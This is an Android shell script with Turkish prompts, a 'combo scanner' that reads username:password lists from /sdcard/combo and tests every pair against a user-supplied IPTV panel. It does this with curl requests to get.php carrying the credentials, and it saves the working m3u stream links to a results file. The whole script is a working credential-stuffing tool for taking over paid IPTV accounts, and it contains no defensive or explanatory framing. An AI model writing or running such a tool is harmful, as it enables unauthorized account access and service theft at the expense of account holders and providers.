#!/system/bin/sh
clear
echo "==================================="
echo "   GERÇEK COMBO SCANNER"
echo "==================================="
echo ""

echo "🎯 BU DOSYALAR GERÇEK KULLANICI:ŞİFRE İÇERİYOR:"
echo "─────────────────────────────────────────────"

# Sadece gerçek combo formatına sahip dosyaları göster
real_combos=()
i=1

for file in /sdcard/combo/*.txt; do
    if [ -f "$file" ]; then
        # Dosyanın gerçek combo formatında olup olmadığını kontrol et
        first_lines=$(head -5 "$file")
        if echo "$first_lines" | grep -q -E "^[a-zA-Z0-9]+:[a-zA-Z0-9]+$"; then
            filename=$(basename "$file")
            linecount=$(wc -l < "$file")
            echo "$i) 🟢 $filename ($linecount satır)"
            real_combos[$i]="$file"
            i=$((i + 1))
        fi
    fi
done

if [ ${#real_combos[@]} -eq 0 ]; then
    echo "❌ Gerçek combo formatında dosya bulunamadı!"
    echo ""
    echo "💡 Sadece şu dosyalar çalışır:"
    echo "   - test_combo.txt"
    echo "   - basic_combo.txt"
    exit 1
fi

echo ""
echo "1. Panel URL'si:"
printf "> "
read panel_url

echo ""
echo "2. Gerçek combo dosyası seçin:"
printf "> "
read file_num

selected_file="${real_combos[$file_num]}"

if [ -z "$selected_file" ]; then
    echo "❌ Geçersiz seçim!"
    exit 1
fi

echo ""
echo "✅ Seçilen: $(basename "$selected_file")"
echo "📊 Bu dosya GERÇEK kullanıcı:şifre içeriyor!"
total_lines=$(wc -l < "$selected_file")

echo ""
echo "🚀 GERÇEK TARAMA BAŞLIYOR..."
echo "──────────────────────────"
echo "📋 Panel: $panel_url"
echo "📁 Dosya: $(basename "$selected_file")"
echo "🎯 Hedef: $total_lines hesap"
echo ""

base_url=$(echo "$panel_url" | sed 's|/$||')
found=0
current=0
result_file="/sdcard/gercek_sonuc_$(date +%s).txt"

echo "# Gerçek Combo Tarama - $(date)" > "$result_file"
echo "# Panel: $panel_url" >> "$result_file"
echo "# Dosya: $(basename "$selected_file")" >> "$result_file"
echo "" >> "$result_file"

while IFS= read -r combo; do
    [ -z "$combo" ] && continue
    current=$((current + 1))
    
    username=$(echo "$combo" | cut -d: -f1)
    password=$(echo "$combo" | cut -d: -f2)
    m3u_url="$base_url/get.php?username=$username&password=$password&type=m3u_plus"
    
    echo -n "🔍 $username:xxx - "
    
    if curl -s --head --connect-timeout 3 "$m3u_url" 2>/dev/null | head -1 | grep -q "200"; then
        echo "✅"
        echo "$m3u_url" >> "$result_file"
        found=$((found + 1))
    else
        echo "❌"
    fi
    
done < "$selected_file"

echo ""
echo "==================================="
echo "          GERÇEK SONUÇ"
echo "==================================="
echo ""
echo "🎉 GERÇEK COMBO TARAMASI TAMAMLANDI!"
echo "📊 Sonuç: $found/$current çalışan hesap"
echo "💾 Kayıt: $result_file"
echo ""

if [ $found -gt 0 ]; then
    echo "📋 Çalışan linkler:"
    cat "$result_file"
else
    echo "❌ Bu combo bu panelde çalışmıyor."
    echo "   Farklı bir panel deneyin."
fi

echo ""
read -p "Devam için Enter..."
